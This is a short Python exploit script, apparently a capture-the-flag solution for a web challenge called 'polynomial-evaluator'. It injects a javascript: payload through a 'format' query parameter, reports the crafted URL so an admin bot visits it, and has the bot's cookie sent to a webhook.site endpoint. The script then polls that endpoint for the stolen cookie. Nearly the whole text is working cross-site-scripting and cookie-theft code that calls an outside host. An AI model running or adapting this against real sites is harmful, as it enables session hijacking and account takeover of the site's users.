#!/usr/bin/env python3
"""polynomial-evaluator exploit: format param -> client-side eval -> admin bot XSS -> steal cookie."""
import requests, urllib.parse, sys, time

BASE  = "https://polynomial.secso.cc"
WB    = "https://webhook.site/<webhook-token>"
TOKEN = "<your-token>"

payload = ("\nvoid [location=\"javascript:location='" + WB
           + "/js-'+encodeURIComponent(document.cookie)\"]")

qs   = urllib.parse.urlencode({"x":"1","y":"2","formula":"x+y","format":payload,"autoEval":"1"})
path = "/?" + qs
print("reporting:", path[:120] + "...")

for _ in range(6):
    r = requests.post(BASE + "/report", data={"url": path}, timeout=25)
    print("report:", r.status_code, r.text.strip()[:80])
    if r.status_code == 202: break
    time.sleep(6)

deadline = time.time() + 180
seen = set()
while time.time() < deadline:
    d = requests.get(f"https://webhook.site/token/{TOKEN}/requests?sorting=newest", timeout=20).json()
    for it in d.get("data", []):
        if it["uuid"] in seen: continue
        seen.add(it["uuid"])
        if "curl" in str(it.get("headers", {}).get("user-agent")): continue
        print("HIT:", it["url"])
        print("  =>", urllib.parse.unquote(it["url"].split("/")[-1]))
    time.sleep(5)
